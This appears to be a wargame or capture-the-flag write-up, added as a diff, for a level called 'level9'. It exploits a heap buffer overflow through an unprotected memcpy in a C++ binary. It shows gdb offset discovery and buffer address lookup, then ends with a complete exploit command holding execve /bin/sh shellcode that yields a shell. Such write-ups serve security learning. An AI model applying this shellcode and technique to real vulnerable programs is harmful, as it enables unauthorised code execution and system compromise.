@@ -1,0 +1,47 @@
+The binary seems to be in cpp (in gdb, info func prints functions like 'operator new(unsigned int)' and 'N::N(int)')
+
+We see that the program calls the function setAnnotation on an object with argv[1], and that function calls an unprotected memcpy,
+we can then do a buffer overflow.
+
+The program tries to dereference %eax two times and then calls the adress obtained
+We can arrange this to call a shellcode, we will take the one used in level2.
+
+To find the offset, we create the string with python:
+python -c "import sys
+for i in range(97, 130): sys.stdout.write(chr(i) * 4)" > /tmp/lvl9
+
+gdb level9
+r `cat /tmp/lvl9`
+=> segfault at 0x08048682
+info reg
+=> eax            0x7c7c7c7c
+0x7c = 124, (124 - 97) * 4 = 108
+
+Check if it is valid:
+r `python -c "print 'a' * 108 + 'bbbb'"`
+=> segfault
+info reg
+=> eax            0x62626262
+0x62 = 'b', the offset is 108.
+
+So out exploit string will be: <pointer to shellcode> + <shellcode> + <padding to get a total of 108 bytes> + <pointer to the start of the string>
+
+As out shellcode is 55 bytes, we need 108 - 55 - 4 = 49 bytes of padding
+
+We still need to find the adress of the start of the string.
+The adress is returned by memcpy, so we just need to examine $eax after the call.
+
+gdb level9
+b *0x08048738
+r abcdefgh
+info reg
+=> eax            0x804a00c
+x/s $eax
+0x804a00c:	 "abcdefgh"
+
+The string is at 0x804a00c, so our shellcode will be at 0x804a010 (0x804a00c + 4 bytes)
+
+Our exploit will then be:
+./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '.' * 49 + '\x0c\xa0\x04\x08'"`
+
+And we have a shell
